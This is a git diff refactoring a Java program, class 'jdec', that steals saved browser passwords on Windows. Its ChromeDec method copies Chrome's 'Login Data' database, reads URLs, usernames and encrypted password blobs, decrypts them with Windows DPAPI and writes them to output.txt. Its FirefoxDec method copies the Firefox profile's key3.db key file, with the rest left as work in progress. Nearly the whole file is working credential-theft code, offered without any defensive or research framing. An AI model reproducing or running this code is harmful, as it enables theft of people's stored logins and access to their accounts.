@@ -31,51 +31,23 @@ import java.sql.Statement;
 
 public class jdec extends Crypt32Util {
 	
-	public static void main(String[] args) throws SQLException, IOException {
+	public static void ChromeDec() throws IOException, SQLException {
 		
-		// Get username, should work for all OS
+		// Get username
 		String user = System.getProperty("user.name");
-		
-		// Get password files
 		
 		// Chrome
 		File chrome = FileUtils.getFile("C:/Users/" + user + "/AppData/Local/Google/Chrome/User Data/Default/Login Data");
 		File chromedest = FileUtils.getFile("logindata.db");
 		FileUtils.copyFile(chrome, chromedest);
-		
-		// Firefox -- Uses a decryption key in the Mozilla folder which we need to use, password file is in JSON format
-		File firefoxloc = FileUtils.getFile("C:/Users/" + user + "/AppData/Roaming/Mozilla/Firefox/Profiles");
-		String[] fuckfirefox = firefoxloc.list();
-		String userloc = new String();
-		
-		// Search for profile default login, potentially other usernames but most people will use default Firefox profile
-		for(String directory : fuckfirefox){
-			if(directory.contains(".default")){
-				userloc = directory;
-			}
-		}
-		
-		// WIP -- Get JSON file, put data into array
-		
-		// Get Key File
-		File firefox = FileUtils.getFile("C:/Users/" + user + "/AppData/Roaming/Mozilla/Firefox/Profiles/" + userloc + "key3.db");
-		File firefoxdest = FileUtils.getFile("logindata2.db");
-		FileUtils.copyFile(firefox, firefoxdest);
-		
-		
-		// Redirect output to text file
-		PrintStream out = new PrintStream(new FileOutputStream("output.txt"));
-		System.setOut(out);
-		
+	
 		Connection conn = null;
-		Connection conn2 = null;
 
 		// Use arguments string for db url
 		String url = "jdbc:sqlite:logindata.db";
-		String url2 = "jdbc:sqlite:logindata2.db";
 		conn = DriverManager.getConnection(url);
-		conn2 = DriverManager.getConnection(url2);
-		
+
+	
 		// SQL Queries
 		Statement stmt1 = conn.createStatement();
 		Statement stmt2 = conn.createStatement();
@@ -87,64 +59,99 @@ public class jdec extends Crypt32Util {
 		String count = "SELECT COUNT(username_value) FROM logins";
 		ResultSet dbcount = stmt4.executeQuery(count);
 		int cint = dbcount.getInt(1);
-		
+	
 		ArrayList<byte[]> bytearray = new ArrayList<byte[]>();
-		
+	
 		ResultSet rsurls = stmt1.executeQuery(sqlurls);
 		ResultSet rsusernames = stmt2.executeQuery(sqlusernames);
 		ResultSet rspassblobs = stmt3.executeQuery(sqlpassblobs);
-		
+	
 		ResultSetMetaData rsmeta = rsurls.getMetaData();
 		int numberofsets = rsmeta.getColumnCount();
-		
+	
 		// URLs into String array
 		int urint = 0;
 		String[] urls = new String[cint];
 		while(urint!=cint){
-			urls[urint] = rsurls.getString(1);
-			rsurls.next();
-			urint++;
+		urls[urint] = rsurls.getString(1);
+		rsurls.next();
+		urint++;
 		}
-		
+	
 		// Usernames into String array
 		int unint = 0;
 		String[] usernames = new String[cint];
-		while(unint!=cint){
-			usernames[unint] = rsusernames.getString(1);
-			rsusernames.next();
-			unint++;
+		while(unint!=cint) {
+		usernames[unint] = rsusernames.getString(1);
+		rsusernames.next();
+		unint++;
 		}
-		
+	
 		int pint = 0;
 		// Putting BLOBs into byte array
-		while(pint!=cint){
-			bytearray.add(rspassblobs.getBytes(1));
-			rspassblobs.next();
-			pint++;
+		while(pint!=cint) {
+		bytearray.add(rspassblobs.getBytes(1));
+		rspassblobs.next();
+		pint++;
 		}
-		
-		
+	
+	
 		ArrayList<byte[]> unencrypted = new ArrayList<byte[]>();
 		int x = 0;
 		boolean work;
 		Object NULL = null;
-		
+	
 		// Decrypt data
-		while(x != cint){
-		unencrypted.add(cryptUnprotectData(bytearray.get(x), 0));
-		x++;
+		while(x != cint) {
+			unencrypted.add(cryptUnprotectData(bytearray.get(x), 0));
+			x++;
 		}
-		
+	
 		// Put decrypted passwords into string array
 		String[] passwords = new String[cint];
-		for(int y = 0; y < cint; y++){
+		for(int y = 0; y < cint; y++) {
 			passwords[y] = new String(unencrypted.get(y), "UTF-8");
 		}
-		
+	
 		// Print results
-		for(int i = 0; i < cint; i++){
-			System.out.println(urls[i] + " -- " + usernames[i] + " -- " + passwords[i]);
+		for(int i = 0; i < cint; i++) {
+		System.out.println(urls[i] + " -- " + usernames[i] + " -- " + passwords[i]);
 		}
+	}
+	
+	public void FirefoxDec() throws IOException {
+		
+		// Get username
+		String user = System.getProperty("user.name");
 
+		// Firefox -- Uses a decryption key in the Mozilla folder which we need to use, password file is in JSON format
+		File firefoxloc = FileUtils.getFile("C:/Users/" + user + "/AppData/Roaming/Mozilla/Firefox/Profiles");
+		String[] fuckfirefox = firefoxloc.list();
+		String userloc = new String();
+	
+		// Search for profile default login, potentially other usernames but most people will use default Firefox profile
+		for(String directory : fuckfirefox){
+			if(directory.contains(".default")){
+				userloc = directory;
+			}
+		}
+	
+		// Get Key File
+		File firefox = FileUtils.getFile("C:/Users/" + user + "/AppData/Roaming/Mozilla/Firefox/Profiles/" + userloc + "key3.db");
+		File firefoxdest = FileUtils.getFile("key3.db");
+		FileUtils.copyFile(firefox, firefoxdest);
+		
+		// WIP -- More to come soon
+		
+	}
+	
+	public static void main(String[] args) throws SQLException, IOException {
+		
+		// Redirect output to text file
+		PrintStream out = new PrintStream(new FileOutputStream("output.txt"));
+		System.setOut(out);
+		
+		ChromeDec();
+		
 	}
 }
